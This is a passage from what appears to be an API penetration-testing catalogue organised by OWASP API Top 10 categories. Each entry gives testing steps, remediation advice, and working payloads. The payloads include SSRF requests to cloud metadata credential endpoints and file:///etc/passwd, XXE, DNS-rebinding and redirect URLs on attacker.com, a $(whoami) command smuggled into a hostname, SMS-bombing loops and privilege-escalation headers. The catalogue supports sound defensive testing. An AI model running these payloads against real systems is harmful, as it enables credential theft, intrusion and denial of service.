      "Test regex-based search with complex patterns (ReDoS)",
      "Request multiple expensive joins or expansions simultaneously",
      "Send wildcard searches that match large datasets"
    ],
    payloads: [
      "GET /api/v1/search?q=a*a*a*a*a*a*a*a*a*a*a*b (ReDoS pattern)",
      "GET /api/v1/data?filter=((((((nested)))))&sort=field1,field2,...field50",
      "GET /api/v1/users?expand=orders.items.reviews.author.profile.settings",
      "POST /api/v1/query -d '{\"filter\":{\"$or\":[{\"field1\":{\"$regex\":\".*\"}},{\"field2\":{\"$regex\":\".*\"}}]}}' (repeated 100x)"
    ],
    remediation: "Set query complexity limits. Implement query cost analysis and reject expensive queries. Set timeouts on database queries. Limit join depth and number of expanded relationships. Use query result caching.",
    severity: "High"
  },
  {
    id: "API4-04",
    name: "Unrestricted File Upload Size",
    category: "Unrestricted Resource Consumption",
    description: "API accepts file uploads without size restrictions, allowing attackers to upload extremely large files to fill disk space or exhaust bandwidth.",
    testingSteps: [
      "Identify file upload endpoints",
      "Test uploading increasingly large files",
      "Check if Content-Length validation is enforced",
      "Test chunked transfer encoding to bypass size checks",
      "Test concurrent large uploads from multiple sessions"
    ],
    payloads: [
      "dd if=/dev/zero bs=1M count=1024 | curl -X POST -F 'file=@-' /api/v1/upload",
      "curl -X POST -H 'Content-Length: 10737418240' -d @/dev/urandom /api/v1/files",
      "curl -X POST -H 'Transfer-Encoding: chunked' --data-binary @large_file /api/v1/upload",
      "for i in $(seq 1 100); do curl -X POST -F 'file=@100mb.bin' /api/v1/upload & done"
    ],
    remediation: "Enforce maximum file size limits at the web server and application level. Validate Content-Length headers. Implement per-user storage quotas. Use streaming uploads with early termination. Scan uploaded content for malicious payloads.",
    severity: "Medium"
  },
  {
    id: "API4-05",
    name: "Expensive Operation Without Throttling",
    category: "Unrestricted Resource Consumption",
    description: "Resource-intensive operations like report generation, data export, or PDF creation have no throttling, allowing attackers to trigger many concurrent expensive operations.",
    testingSteps: [
      "Identify endpoints that perform expensive operations (exports, reports, analytics)",
      "Trigger multiple concurrent requests to these endpoints",
      "Check if there is a queue or concurrency limit",
      "Measure server resource consumption during the attack",
      "Test if partially completed operations can be re-triggered"
    ],
    payloads: [
      "for i in $(seq 1 50); do curl -X POST /api/v1/reports/generate -d '{\"range\":\"all\"}' & done",
      "for i in $(seq 1 100); do curl -X POST /api/v1/export/full -d '{\"format\":\"pdf\"}' & done",
      "POST /api/v1/analytics/compute -d '{\"dataset\":\"*\",\"operations\":[\"aggregate\",\"correlate\",\"forecast\"]}'"
    ],
    remediation: "Implement request queuing for expensive operations. Limit concurrent operations per user. Use background job processing with status polling. Set timeouts on long-running operations. Implement cost-based rate limiting.",
    severity: "Medium"
  },
  {
    id: "API4-06",
    name: "SMS/Email Bombing via API",
    category: "Unrestricted Resource Consumption",
    description: "APIs that trigger SMS or email notifications (OTP, verification, password reset) lack rate limiting, enabling attackers to bomb targets with messages or incur excessive costs.",
    testingSteps: [
      "Identify endpoints that trigger SMS/email (verification, OTP, alerts)",
      "Send repeated requests to trigger messages to the same number/email",
      "Check if there is a cooldown period between sends",
      "Test with different user accounts targeting the same phone/email",
      "Calculate potential cost per message multiplied by request volume"
    ],
    payloads: [
      "for i in $(seq 1 1000); do curl -X POST /api/auth/send-otp -d '{\"phone\":\"+1234567890\"}'; done",
      "for i in $(seq 1 500); do curl -X POST /api/auth/forgot-password -d '{\"email\":\"victim@corp.com\"}'; done",
      "POST /api/v1/invite -d '{\"email\":\"victim@corp.com\"}' (repeated 1000 times)",
      "POST /api/v1/notifications/send -d '{\"user_id\":\"victim\",\"message\":\"spam\"}' (repeated)"
    ],
    remediation: "Implement cooldown periods between sends (e.g., 60 seconds). Set daily caps per recipient. Require CAPTCHA for unauthenticated trigger endpoints. Monitor for abuse patterns. Implement per-IP and per-recipient rate limits.",
    severity: "Medium"
  },
  {
    id: "API4-07",
    name: "Memory Exhaustion via Deeply Nested JSON",
    category: "Unrestricted Resource Consumption",
    description: "API parsers that accept deeply nested JSON or XML structures can have their memory and CPU exhausted through recursive parsing of pathological inputs.",
    testingSteps: [
      "Send JSON with increasing nesting depth",
      "Monitor server response times and error messages",
      "Test with 100, 1000, 10000, and 100000 levels of nesting",
      "Test with deeply nested arrays and objects",
      "Check if the parser has a maximum depth limit"
    ],
    payloads: [
      "python3 -c \"print('{' * 100000 + '\"a\":1' + '}' * 100000)\" | curl -X POST -d @- /api/v1/data",
      "python3 -c \"print('[' * 50000 + '1' + ']' * 50000)\" | curl -X POST -d @- /api/v1/process",
      "{\"a\":{\"a\":{\"a\":{...}}}} (nested 10000 levels deep)",
      "XML equivalent: <a><a><a>... (billion laughs variant)"
    ],
    remediation: "Set maximum JSON/XML parsing depth (e.g., 20 levels). Implement request body size limits. Use streaming parsers with depth limits. Set memory limits per request. Monitor for parser-related resource consumption.",
    severity: "Medium"
  },
  {
    id: "API4-08",
    name: "GraphQL Query Depth/Complexity Abuse",
    category: "Unrestricted Resource Consumption",
    description: "GraphQL APIs without query complexity analysis allow deeply nested or circular queries that cause exponential data fetching and resource exhaustion.",
    testingSteps: [
      "Craft deeply nested queries following circular relationships",
      "Test query depth limits with increasing nesting",
      "Send queries that reference exponentially expanding relationships",
      "Test batch queries with many operations",
      "Measure server response time with increasing complexity"
    ],
    payloads: [
      "query { users { friends { friends { friends { friends { friends { name } } } } } } }",
      "query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }",
      "query { posts(first:100) { comments(first:100) { author { posts(first:100) { comments(first:100) { text } } } } } }",
      "[{\"query\":\"{ user { name } }\"}, ...] (1000 queries in batch)"
    ],
    remediation: "Implement query depth limiting (e.g., max depth 10). Use query cost analysis to reject expensive queries. Set query complexity budgets per user. Limit batch query sizes. Use persisted queries in production.",
    severity: "High"
  },

  // ── Broken Function Level Authorization (API5:2023) ──────────────────

  {
    id: "API5-01",
    name: "Vertical Privilege Escalation via Admin Endpoints",
    category: "Broken Function Level Authorization",
    description: "Regular users can access administrative API endpoints because function-level authorization is not enforced, allowing unauthorized access to admin functionality.",
    testingSteps: [
      "Enumerate admin endpoints from documentation, source code, or JS files",
      "Authenticate as a regular user",
      "Send requests to admin endpoints with the regular user's token",
      "Test common admin paths: /admin, /manage, /internal, /system",
      "Check if the API returns different data based on claimed role"
    ],
    payloads: [
      "GET /api/admin/users (with regular user token)",
      "POST /api/admin/users -d '{\"email\":\"new@admin.com\",\"role\":\"admin\"}' (with user token)",
      "DELETE /api/admin/users/target_id (with user token)",
      "PUT /api/admin/settings -d '{\"maintenance_mode\":true}' (with user token)",
      "GET /api/internal/metrics (with user token)"
    ],
    remediation: "Implement role-based access control (RBAC) at the function level. Use centralized authorization middleware. Deny access by default and explicitly grant permissions. Separate admin endpoints into a different API or network segment.",
    severity: "Critical"
  },
  {
    id: "API5-02",
    name: "HTTP Method Override for Privilege Escalation",
    category: "Broken Function Level Authorization",
    description: "APIs accepting method override headers (X-HTTP-Method-Override, X-Method-Override) allow attackers to bypass method-based authorization checks.",
    testingSteps: [
      "Send a POST request with X-HTTP-Method-Override: DELETE header",
      "Test X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method headers",
      "Check if _method parameter in query string or body is accepted",
      "Test overriding to PUT, PATCH, DELETE from a POST request",
      "Verify if authorization checks consider the overridden method"
    ],
    payloads: [
      "POST /api/v1/users/admin_id -H 'X-HTTP-Method-Override: DELETE'",
      "POST /api/v1/config -H 'X-Method-Override: PUT' -d '{\"debug\":true}'",
      "POST /api/v1/data?_method=DELETE",
      "POST /api/v1/users/me -H 'X-HTTP-Method: PATCH' -d '{\"role\":\"admin\"}'",
      "POST /api/v1/resource -H 'X-HTTP-Method-Override: OPTIONS'"
    ],
    remediation: "Disable HTTP method override headers in production. If required, ensure authorization checks use the effective (overridden) method. Restrict method override to specific trusted clients only.",
    severity: "High"
  },
  {
    id: "API5-03",
    name: "API Version Downgrade for Missing Auth",
    category: "Broken Function Level Authorization",
    description: "Older API versions may lack authorization checks that were added in newer versions. Attackers access deprecated version endpoints that still function but lack security controls.",
    testingSteps: [
      "Identify the current API version (e.g., /api/v3/)",
      "Test older versions: /api/v2/, /api/v1/, /api/v0/",
      "Check if older versions lack authorization on sensitive endpoints",
      "Test endpoints that were restricted in newer versions",
      "Check for version-specific behavior differences"
    ],
    payloads: [
      "GET /api/v1/admin/users (when v3 requires admin role)",
      "GET /api/v0/users/export (when v2 requires special permission)",
      "POST /api/v1/settings/global (when v3 restricts to superadmin)",
      "DELETE /api/v1/data/all (when v2 added confirmation requirement)"
    ],
    remediation: "Apply the same security controls across all API versions. Deprecate and remove old API versions promptly. Use a shared authorization middleware across versions. Redirect old version requests to current versions.",
    severity: "High"
  },
  {
    id: "API5-04",
    name: "Role Parameter Tampering",
    category: "Broken Function Level Authorization",
    description: "API relies on client-supplied role information (in headers, cookies, or request body) rather than server-side role lookup, allowing privilege escalation by modifying the role claim.",
    testingSteps: [
      "Inspect requests for role-related parameters or headers",
      "Check for headers like X-User-Role, X-Admin, X-Permissions",
      "Check cookies for role values",
      "Test modifying role parameters to admin, superuser, root",
      "Check if the API trusts client-supplied role claims without verification"
    ],
    payloads: [
      "GET /api/v1/admin/dashboard -H 'X-User-Role: admin'",
      "GET /api/v1/data -H 'X-Admin: true'",
      "GET /api/v1/restricted -b 'role=admin; user_type=superuser'",
      "POST /api/v1/action -d '{\"user_role\":\"admin\"}' -H 'X-Permissions: *'"
    ],
    remediation: "Never trust client-supplied role information. Derive roles from the authenticated session server-side. Remove role-related headers from incoming requests at the gateway. Implement server-side role lookup from a trusted source.",
    severity: "Critical"
  },
  {
    id: "API5-05",
    name: "Cross-Tenant Function Access",
    category: "Broken Function Level Authorization",
    description: "In multi-tenant APIs, functions restricted to certain tenants (e.g., enterprise features) can be accessed by users from other tenants that should not have access.",
    testingSteps: [
      "Identify tenant-specific features or endpoints",
      "Authenticate with a free-tier or basic tenant account",
      "Access endpoints reserved for premium/enterprise tenants",
      "Test using another tenant's identifier in requests",
      "Check if feature flags are enforced server-side"
    ],
    payloads: [
      "GET /api/v1/enterprise/analytics (with basic tier token)",
      "POST /api/v1/premium/export -d '{\"format\":\"full\"}' (with free tier token)",
      "GET /api/v1/features/sso-config (with non-SSO tenant token)",
      "PUT /api/v1/tenants/other_tenant/settings (cross-tenant)"
    ],
    remediation: "Enforce tenant-level authorization on all endpoints. Implement feature flags with server-side verification. Use tenant isolation at the middleware level. Validate tenant membership for every request.",
    severity: "High"
  },
  {
    id: "API5-06",
    name: "Bypassing Authorization via Content-Type Manipulation",
    category: "Broken Function Level Authorization",
    description: "API authorization middleware may only process certain content types. Sending requests with unexpected Content-Type headers may bypass authorization checks entirely.",
    testingSteps: [
      "Send the same request with different Content-Type headers",
      "Test: application/json, application/xml, text/plain, multipart/form-data",
      "Check if authorization is enforced regardless of content type",
      "Test with malformed or missing Content-Type headers",
      "Verify if the API processes the request body correctly with each type"
    ],
    payloads: [
      "POST /api/v1/admin -H 'Content-Type: text/plain' -d '{\"action\":\"delete_all\"}'",
      "POST /api/v1/restricted -H 'Content-Type: application/xml' -d '<request><role>admin</role></request>'",
      "POST /api/v1/protected -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=admin_reset'",
      "POST /api/v1/secure (without Content-Type header)"
    ],
    remediation: "Apply authorization checks regardless of content type. Validate and restrict accepted content types. Implement authorization at a layer before content parsing. Reject requests with unexpected content types.",
    severity: "Medium"
  },
  {
    id: "API5-07",
    name: "Function Access via Alternate Endpoints",
    category: "Broken Function Level Authorization",
    description: "Same functionality accessible through multiple paths (aliases, legacy routes, internal routes) where not all paths enforce the same authorization controls.",
    testingSteps: [
      "Map all routes to the same controller/handler",
      "Test aliases: /api/users, /api/v1/users, /users, /internal/users",
      "Test path normalization issues: /api/v1//users, /api/v1/./users",
      "Look for undocumented path patterns that reach the same handler",
      "Test with and without trailing slashes"
    ],
    payloads: [
      "GET /internal/users (when /api/v1/users requires auth)",
      "GET /api/v1/admin/../users/all (path traversal to bypass)",
      "GET /api//v1//admin//users (double slash bypass)",
      "GET /api/v1/users%2fall (URL encoded path separator)"
    ],
    remediation: "Centralize route definitions. Apply authorization at the controller/handler level rather than the route level. Normalize paths before authorization checks. Remove legacy and internal route aliases.",
    severity: "High"
  },
  {
    id: "API5-08",
    name: "Accessing Debug/Diagnostic Functions",
    category: "Broken Function Level Authorization",
    description: "Debug and diagnostic endpoints left accessible in production allow attackers to access sensitive system information, configuration, or execute diagnostic commands.",
    testingSteps: [
      "Scan for common debug endpoints",
      "Check framework-specific debug paths (Spring Actuator, Rails info, Django debug)",
      "Test for profiling and tracing endpoints",
      "Look for configuration dump endpoints",
      "Check for database admin interfaces"
    ],
    payloads: [
      "GET /actuator/env (Spring Boot)",
      "GET /actuator/heapdump",
      "GET /_debug/vars (Go)",
      "GET /api/debug/config",
      "GET /elmah.axd (ASP.NET)",
      "GET /api/v1/health/detailed?include=config",
      "GET /trace",
      "GET /api/phpinfo"
    ],
    remediation: "Remove or disable all debug endpoints in production. Use environment-based configuration to prevent debug features from activating. Implement network-level restrictions for diagnostic endpoints. Monitor for access to debug paths.",
    severity: "High"
  },

  // ── Unrestricted Access to Sensitive Business Flows (API6:2023) ──────

  {
    id: "API6-01",
    name: "Automated Purchase/Checkout Abuse",
    category: "Unrestricted Access to Sensitive Business Flows",
    description: "Automated bots can exploit purchase flows faster than human users, enabling ticket scalping, limited-item hoarding, or flash sale abuse.",
    testingSteps: [
      "Analyze the purchase/checkout flow for anti-automation controls",
      "Script the entire purchase flow from product selection to payment",
      "Test timing to see if bot speed provides unfair advantage",
      "Check for CAPTCHA, device fingerprinting, or behavioral analysis",
      "Test if multiple accounts can be used to circumvent per-user limits"
    ],
    payloads: [
      "Scripted: POST /api/v1/cart/add -> POST /api/v1/checkout -> POST /api/v1/payment (automated loop)",
      "POST /api/v1/reserve -d '{\"item_id\":\"limited_item\",\"quantity\":100}'",
      "Concurrent requests to /api/v1/purchase from multiple sessions simultaneously",
      "POST /api/v1/orders (1000 requests in 1 second from 100 different accounts)"
    ],
    remediation: "Implement CAPTCHA for critical business flows. Add behavioral analysis and device fingerprinting. Enforce per-user purchase limits. Add artificial delays to prevent bot advantage. Use queueing systems for high-demand items.",
    severity: "Medium"
  },
  {
    id: "API6-02",
    name: "Referral/Coupon System Abuse",
    category: "Unrestricted Access to Sensitive Business Flows",
    description: "Referral programs and coupon systems without proper controls can be exploited through self-referrals, fake accounts, or coupon enumeration/reuse.",
    testingSteps: [
      "Test self-referral (using your own referral code on a new account)",
      "Generate multiple accounts to exploit referral bonuses",
      "Test coupon code enumeration (sequential, predictable patterns)",
      "Check if expired or used coupons can be reapplied",
      "Test stacking multiple coupons/referral bonuses"
    ],
    payloads: [
      "POST /api/v1/referral/apply -d '{\"code\":\"MY_OWN_REFERRAL_CODE\"}'",
      "POST /api/v1/coupons/apply -d '{\"code\":\"SAVE10\"}' (then '{\"code\":\"SAVE20\"}' stacking)",
      "for code in $(seq -w 1000 9999); do curl -X POST /api/v1/coupons/validate -d \"{\\\"code\\\":\\\"PROMO$code\\\"}\"; done",
      "POST /api/v1/signup -d '{\"referral\":\"attacker_code\"}' (repeated with disposable emails)"
    ],
    remediation: "Implement fraud detection for referral programs. Validate referral eligibility server-side. Use non-sequential coupon codes. Limit coupon usage per account, IP, and device. Implement velocity checks on referral redemptions.",
    severity: "Medium"
  },
  {
    id: "API6-03",
    name: "Review/Rating Manipulation",
    category: "Unrestricted Access to Sensitive Business Flows",
    description: "Review and rating systems without anti-fraud controls allow automated creation of fake reviews, vote manipulation, or reputation inflation/deflation.",
    testingSteps: [
      "Test submitting multiple reviews from the same account",
      "Test review submission without purchase verification",
      "Automate review creation from multiple fake accounts",
      "Test vote/like manipulation through rapid automated requests",
      "Check if reviews can be backdated"
    ],
    payloads: [
      "POST /api/v1/reviews -d '{\"product_id\":\"target\",\"rating\":5,\"text\":\"Great!\"}' (repeated 100x)",
      "POST /api/v1/reviews/review_id/vote -d '{\"direction\":\"up\"}' (repeated 1000x)",
      "for i in $(seq 1 500); do curl -X POST /api/v1/reviews -H \"Authorization: token_$i\" -d '{\"rating\":1}'; done",
      "POST /api/v1/reviews -d '{\"product_id\":\"competitor\",\"rating\":1,\"verified_purchase\":true}'"
    ],
    remediation: "Require purchase verification for reviews. Implement duplicate detection. Use behavioral analysis to detect automated reviews. Rate limit review submissions. Implement review moderation and fraud scoring.",
    severity: "Low"
  },
  {
    id: "API6-04",
    name: "Account Creation Bot Abuse",
    category: "Unrestricted Access to Sensitive Business Flows",
    description: "Registration endpoints without anti-bot measures allow mass account creation for spam, fraud, credential stuffing infrastructure, or abuse of per-account trial benefits.",
    testingSteps: [
      "Automate the registration flow with a script",
      "Test registration without CAPTCHA or email verification",
      "Create accounts using disposable email services",
      "Check for device fingerprinting or IP-based limits",
      "Test if phone verification can be bypassed"
    ],
    payloads: [
      "for i in $(seq 1 1000); do curl -X POST /api/v1/register -d \"{\\\"email\\\":\\\"user$i@tempmail.com\\\",\\\"password\\\":\\\"Pass123!\\\"}\"; done",
      "POST /api/v1/signup -d '{\"email\":\"bot+$RANDOM@disposable.email\",\"password\":\"BotPass1!\"}'",
      "POST /api/v1/register -d '{\"phone\":\"+1555000$i\",\"password\":\"Test123!\"}' (sequential numbers)"
    ],
    remediation: "Implement CAPTCHA on registration. Require email/phone verification. Block disposable email domains. Implement device fingerprinting. Add IP-based rate limiting. Use behavioral analysis to detect bot patterns.",
    severity: "Medium"
  },
  {
    id: "API6-05",
    name: "Content Scraping at Scale",
    category: "Unrestricted Access to Sensitive Business Flows",
    description: "APIs serving valuable content (pricing, product data, user profiles) lack anti-scraping controls, allowing competitors or data brokers to harvest entire datasets.",
    testingSteps: [
      "Automate sequential fetching of all resources through pagination",
      "Test if rate limiting kicks in during sustained scraping",
      "Check for bot detection (CAPTCHA, fingerprinting) on list endpoints",
      "Test if search endpoints can be abused for targeted data extraction",
      "Measure total data volume accessible through the API"
    ],
    payloads: [
      "for page in $(seq 1 10000); do curl -s /api/v1/products?page=$page >> all_products.json; done",
      "GET /api/v1/users?fields=name,email,phone&limit=100&offset=0 (incrementing offset)",
      "GET /api/v1/prices?category=all&format=csv (bulk export)",
      "GET /api/v1/listings?sort=id&after=last_id (cursor-based full dump)"
    ],
    remediation: "Implement progressive rate limiting for list endpoints. Use behavioral analysis to detect scraping patterns. Require authentication with abuse monitoring. Implement pagination limits. Use honeypot data to detect scraping.",
    severity: "Medium"
  },
  {
    id: "API6-06",
    name: "Automated Bidding/Trading Exploitation",
    category: "Unrestricted Access to Sensitive Business Flows",
    description: "Auction, bidding, or trading APIs without anti-automation controls allow bots to outpace human users through sniping, front-running, or wash trading.",
    testingSteps: [
      "Script rapid bid placement near auction end times",
      "Test if there are minimum time intervals between bids",
      "Check for anti-sniping extensions on auctions",
      "Test placing and canceling bids rapidly to manipulate pricing",
      "Test if API allows monitoring without rate limits (polling for prices)"
    ],
    payloads: [
      "while true; do curl -X POST /api/v1/bids -d '{\"auction\":\"target\",\"amount\":\"current+1\"}'; sleep 0.01; done",
      "POST /api/v1/trades -d '{\"buy\":\"asset\",\"sell\":\"asset\",\"amount\":1000}' (wash trading)",
      "GET /api/v1/auctions/target/status (polling every 10ms for snipe timing)",
      "POST /api/v1/bids -d '{\"auction\":\"target\",\"amount\":999999}' ; DELETE /api/v1/bids/last (bid manipulation)"
    ],
    remediation: "Implement anti-sniping mechanisms. Add minimum time intervals between actions. Use behavioral analysis to detect automated trading. Implement CAPTCHA for critical actions. Monitor for wash trading patterns.",
    severity: "Medium"
  },

  // ── Server Side Request Forgery (API7:2023) ──────────────────────────

  {
    id: "API7-01",
    name: "SSRF via URL Parameter",
    category: "Server Side Request Forgery",
    description: "API accepts a URL parameter and fetches its content server-side without proper validation, allowing access to internal services, cloud metadata, and local resources.",
    testingSteps: [
      "Identify endpoints accepting URL parameters (webhooks, imports, previews)",
      "Test with internal IP addresses (127.0.0.1, 10.x.x.x, 172.16.x.x, 192.168.x.x)",
      "Test cloud metadata endpoints (169.254.169.254)",
      "Test internal service ports (localhost:6379, localhost:9200)",
      "Test protocol handlers (file://, gopher://, dict://)"
    ],
    payloads: [
      "POST /api/v1/fetch -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'",
      "POST /api/v1/import -d '{\"url\":\"http://127.0.0.1:6379/\"}'",
      "POST /api/v1/preview -d '{\"url\":\"file:///etc/passwd\"}'",
      "POST /api/v1/webhook/test -d '{\"url\":\"http://internal-api.local/admin\"}'",
      "POST /api/v1/avatar -d '{\"url\":\"gopher://127.0.0.1:25/xHELO%20evil.com\"}'"
    ],
    remediation: "Implement URL allowlists. Block requests to private IP ranges. Disable unnecessary protocol handlers. Use a dedicated egress proxy. Validate and sanitize URLs. Block access to cloud metadata endpoints.",
    severity: "Critical"
  },
  {
    id: "API7-02",
    name: "SSRF via DNS Rebinding",
    category: "Server Side Request Forgery",
    description: "URL validation checks the DNS resolution at validation time, but a DNS rebinding attack changes the resolution to an internal IP between validation and the actual request.",
    testingSteps: [
      "Set up a DNS rebinding service (e.g., rbndr.us)",
      "Configure DNS to alternate between a public IP and internal IP",
      "Submit the rebinding domain as a URL parameter",
      "Check if the request ultimately reaches the internal network",
      "Test with various TTL values and rebinding strategies"
    ],
    payloads: [
      "POST /api/v1/fetch -d '{\"url\":\"http://7f000001.c0a80001.rbndr.us/internal\"}'",
      "POST /api/v1/import -d '{\"url\":\"http://rebind.attacker.com/admin\"}'",
      "POST /api/v1/webhook -d '{\"url\":\"http://A.169.254.169.254.1time.attacker.com/\"}'",
      "POST /api/v1/proxy -d '{\"url\":\"http://make-169.254.169.254-rebind.attacker.com/latest/meta-data/\"}'"
    ],
    remediation: "Resolve DNS and validate the IP at request time (not just at validation time). Re-check the IP after following redirects. Use a network-level deny list for internal IPs. Pin DNS resolution for the duration of the request.",
    severity: "High"
  },
  {
    id: "API7-03",
    name: "SSRF via Redirect Chain",
    category: "Server Side Request Forgery",
    description: "Initial URL passes validation but redirects to an internal resource. The API follows redirects without re-validating the destination URL.",
    testingSteps: [
      "Set up a redirect on an attacker-controlled server pointing to internal IPs",
      "Submit the external URL (which redirects to internal) as a parameter",
      "Check if the API follows the redirect and accesses internal resources",
      "Test with multiple redirect hops",
      "Test with URL shorteners that redirect to internal addresses"
    ],
    payloads: [
      "POST /api/v1/fetch -d '{\"url\":\"https://attacker.com/redirect?to=http://169.254.169.254/\"}'",
      "POST /api/v1/import -d '{\"url\":\"https://bit.ly/internal-resource\"}'",
      "POST /api/v1/preview -d '{\"url\":\"https://evil.com/302?location=http://localhost:8080/admin\"}'",
      "POST /api/v1/screenshot -d '{\"url\":\"https://evil.com/chain?hop1=evil2.com&hop2=127.0.0.1\"}'"
    ],
    remediation: "Disable following redirects or re-validate each redirect destination. Limit the number of allowed redirects. Block redirects to internal IP ranges. Log and alert on redirect-based SSRF attempts.",
    severity: "High"
  },
  {
    id: "API7-04",
    name: "SSRF via File Upload Processing",
    category: "Server Side Request Forgery",
    description: "File processing features (SVG rendering, PDF generation, XML parsing, document conversion) can trigger SSRF when the file content references external or internal URLs.",
    testingSteps: [
      "Upload an SVG with embedded xlink:href pointing to internal resources",
      "Upload an XML with external entity references to internal URLs",
      "Upload a document with embedded images pointing to internal URLs",
      "Test HTML-to-PDF converters with <iframe> or <img> tags pointing internally",
      "Test XSLT processing with document() function pointing internally"
    ],
    payloads: [
      "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"http://169.254.169.254/latest/meta-data/\"/></svg>",
      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-server/secret\">]><root>&xxe;</root>",
      "<html><body><img src=\"http://127.0.0.1:8080/admin\"><iframe src=\"http://169.254.169.254/\"></iframe></body></html>",
      "Upload DOCX with relationship pointing to http://internal-api/config"
    ],
    remediation: "Sanitize uploaded file content for URL references. Process file conversions in sandboxed environments without network access. Validate and filter all URLs in uploaded content. Use allowlists for external resource fetching.",
    severity: "High"
  },
  {
    id: "API7-05",
    name: "SSRF via Cloud Metadata Access",
    category: "Server Side Request Forgery",
    description: "Exploiting SSRF to access cloud provider metadata services to steal IAM credentials, configuration, and sensitive instance data.",
    testingSteps: [
      "Test access to AWS metadata: http://169.254.169.254/latest/meta-data/",
      "Test access to GCP metadata: http://metadata.google.internal/computeMetadata/v1/",
      "Test access to Azure metadata: http://169.254.169.254/metadata/instance",
      "Test for IAM role credentials in AWS metadata",
      "Test various bypass techniques for metadata endpoint access"
    ],
    payloads: [
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/latest/user-data",
      "http://metadata.google.internal/computeMetadata/v1/?recursive=true (with Metadata-Flavor: Google)",
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (with Metadata: true)",
      "http://169.254.169.254/latest/dynamic/instance-identity/document",
      "http://[::ffff:169.254.169.254]/latest/meta-data/ (IPv6 bypass)",
      "http://0xA9FEA9FE/latest/meta-data/ (hex IP bypass)",
      "http://2852039166/latest/meta-data/ (decimal IP bypass)"
    ],
    remediation: "Block access to metadata endpoints (169.254.169.254) at the network level. Use IMDSv2 (token-required) on AWS. Configure metadata endpoint restrictions. Use workload identity federation instead of instance metadata for credentials.",
    severity: "Critical"
  },
  {
    id: "API7-06",
    name: "SSRF via Webhook Configuration",
    category: "Server Side Request Forgery",
    description: "Webhook configuration endpoints allow users to set callback URLs. Without proper validation, these can be pointed at internal services to exfiltrate data or perform actions.",
    testingSteps: [
      "Register a webhook with an internal URL as the callback",
      "Test with localhost, internal IPs, and internal hostnames",
      "Trigger the webhook event and observe if internal data is sent",
      "Test webhook retry mechanisms with changing DNS (rebinding)",
      "Check if webhook payloads include sensitive data sent to attacker URLs"
    ],
    payloads: [
      "POST /api/v1/webhooks -d '{\"url\":\"http://127.0.0.1:8500/v1/kv/secrets\",\"event\":\"order.created\"}'",
      "POST /api/v1/webhooks -d '{\"url\":\"http://redis.internal:6379/\",\"event\":\"user.updated\"}'",
      "POST /api/v1/webhooks -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\",\"event\":\"*\"}'",
      "POST /api/v1/integrations -d '{\"callback_url\":\"http://internal-api:3000/admin/users\"}'"
    ],
    remediation: "Validate webhook URLs against an allowlist of external domains. Block internal IPs and reserved ranges. Verify webhook destinations through a challenge-response mechanism. Monitor webhook traffic for internal access patterns.",
    severity: "High"
  },
  {
    id: "API7-07",
    name: "SSRF via PDF/Image Generation",
    category: "Server Side Request Forgery",
    description: "APIs that generate PDFs, thumbnails, or screenshots from user-supplied HTML/URLs can be exploited for SSRF through embedded resource references.",
    testingSteps: [
      "Find endpoints that render HTML to PDF or generate screenshots",
      "Include <img>, <script>, <link>, <iframe> tags with internal URLs",
      "Test CSS @import and url() with internal addresses",
      "Test JavaScript fetch/XMLHttpRequest in rendered HTML",
      "Check if the rendered output includes data from internal resources"
    ],
    payloads: [
      "POST /api/v1/pdf/generate -d '{\"html\":\"<img src=http://169.254.169.254/latest/meta-data/>\"}'",
      "POST /api/v1/screenshot -d '{\"url\":\"http://127.0.0.1:8080/admin\"}'",
      "POST /api/v1/render -d '{\"html\":\"<link rel=stylesheet href=http://internal:3000/api/users>\"}'",
      "POST /api/v1/thumbnail -d '{\"html\":\"<script>fetch(\\\"http://169.254.169.254/\\\").then(r=>r.text()).then(t=>document.write(t))</script>\"}'"
    ],
    remediation: "Run rendering engines in sandboxed environments without network access to internal resources. Validate and sanitize all URLs in HTML content. Use a whitelist for allowed resource domains. Disable JavaScript execution in renderers when possible.",
    severity: "High"
  },
  {
    id: "API7-08",
    name: "Blind SSRF with Out-of-Band Detection",
    category: "Server Side Request Forgery",
    description: "Even when SSRF responses are not returned to the attacker, blind SSRF can be detected through out-of-band channels (DNS resolution, HTTP callbacks) and exploited for port scanning or internal service discovery.",
    testingSteps: [
      "Set up a collaborator/callback server to detect out-of-band interactions",
      "Submit URLs pointing to your callback server as parameters",
      "Monitor for DNS lookups and HTTP requests from the target server",
      "Use timing-based detection (response time differs for open vs closed ports)",
      "Map internal network by testing different IP:port combinations"
    ],
    payloads: [
      "POST /api/v1/validate-url -d '{\"url\":\"http://attacker-collaborator.com/ssrf-test\"}'",
      "POST /api/v1/import -d '{\"url\":\"http://internal-scan.127.0.0.1.nip.io:PORT/\"}'",
      "POST /api/v1/fetch -d '{\"url\":\"http://unique-id.burpcollaborator.net\"}'",
      "POST /api/v1/webhook -d '{\"url\":\"http://$(whoami).attacker.com/\"}'"
    ],
    remediation: "Apply the same SSRF protections even when responses are not returned. Block outbound DNS to untrusted resolvers. Use egress filtering. Monitor for unusual outbound connection patterns. Implement request logging for SSRF-susceptible endpoints.",
    severity: "Medium"
  },

  // ── Security Misconfiguration (API8:2023) ────────────────────────────

  {
    id: "API8-01",
    name: "Verbose Error Messages Exposing Internals",
    category: "Security Misconfiguration",
    description: "API returns detailed error messages containing stack traces, database queries, file paths, or framework details that help attackers understand internal architecture.",
    testingSteps: [
      "Send malformed requests (invalid JSON, wrong types, missing fields)",
      "Test with SQL injection payloads to trigger database errors",
      "Send requests that cause server errors (divide by zero, null reference)",
      "Check error responses for stack traces, file paths, library versions",
      "Test various HTTP error codes for information disclosure"
    ],
    payloads: [
      "POST /api/v1/data -d '{invalid json}'",
      "GET /api/v1/users/not-a-number",
      "POST /api/v1/query -d '{\"filter\":\"\\' OR 1=1 --\"}'",
      "GET /api/v1/nonexistent-endpoint",
      "POST /api/v1/data -H 'Content-Type: application/xml' -d '<invalid'"
    ],
